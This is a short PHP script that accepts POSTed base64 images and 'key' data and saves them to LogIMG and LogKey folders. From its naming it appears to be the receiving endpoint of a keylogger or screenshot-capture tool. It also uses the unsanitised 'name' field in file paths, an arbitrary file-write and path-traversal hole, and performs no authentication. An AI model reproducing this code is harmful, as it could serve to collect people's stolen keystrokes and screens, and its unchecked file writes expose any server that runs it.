<?php
if(isset($_POST['dataIMG']) && !empty($_POST['dataIMG'])){
    echo _SaveLog($_POST['dataKey'],$_POST['dataIMG'],$_POST['name']);
}

function _SaveLog($dataKey,$base64_string,$name) {
    $img = str_replace('data:image/png;base64,', '', $base64_string);
    $img = str_replace(' ', '+', $img);
    $data = base64_decode($img);
    file_put_contents(dirname(__FILE__) . "/LogIMG/".$name.".png", $data);
    file_put_contents(dirname(__FILE__) . "/LogKey/".$name.".txt",$dataKey);
    return true;
}

?>